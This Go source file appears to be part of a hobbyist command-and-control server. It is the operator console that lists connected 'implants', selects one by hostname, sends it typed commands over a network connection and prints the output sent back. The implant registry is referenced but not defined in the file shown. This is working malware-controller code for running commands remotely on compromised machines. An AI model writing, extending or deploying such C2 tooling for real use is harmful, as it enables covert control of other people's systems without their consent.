package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var pendingCommand string
var outputDone = make(chan bool)
var selectedImplant string

func helpMenu() {
	fmt.Println("/implants,	Description:Will show all connected implants")
	fmt.Println("use <implant-name>, Description:Connect to a specified implant")
}

func listImplants() {
	for _, implant := range implants {
		status := "inactive"
		if implant.Active {
			status = "Active"
		}

		fmt.Printf("[+] ID:%s Status:%s Last Seen:%s\n", implant.Hostname, status, implant.LastSeen.Format("15:04:05"))
	}

}
func getUserInput() {
	input := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("[operator]> ")
		command, err := input.ReadString('\n')
		if err != nil {
			log.Println("[-] Error reading input:", err)
			return
		}

		command = strings.TrimSpace(command)
		if command == "help" {
			helpMenu()
			continue
		}

		command = strings.TrimSpace(command)
		if command == "/implants" {
			listImplants()
			continue
		}

		if strings.HasPrefix(command, "use ") {
			selectedImplant = strings.TrimPrefix(command, "use ")
			fmt.Println("[*] Selected: ", selectedImplant)
			continue
		}

		if selectedImplant == "" {
			fmt.Println("[!] No implant selected")
			continue
		}

		implants[selectedImplant].Command = command
		<-outputDone // Receving a value from channel i believe
	}
}

func sendCommands(conn net.Conn, command string) {

	_, err := conn.Write([]byte(command))
	if err != nil {
		log.Println("[-] Error sending command", err)
		return
	}

	fmt.Println("\n[+] Command sent successfully")
}

func receiveOutput(reader *bufio.Reader) {
	response := bufio.NewReader(reader)
	for {
		output, err := response.ReadString('\n')
		if err != nil {
			return
		}
		if strings.TrimSpace(output) == "END_OF_OUTPUT" {
			outputDone <- true
			return
		}
		fmt.Print(output)
	}
}
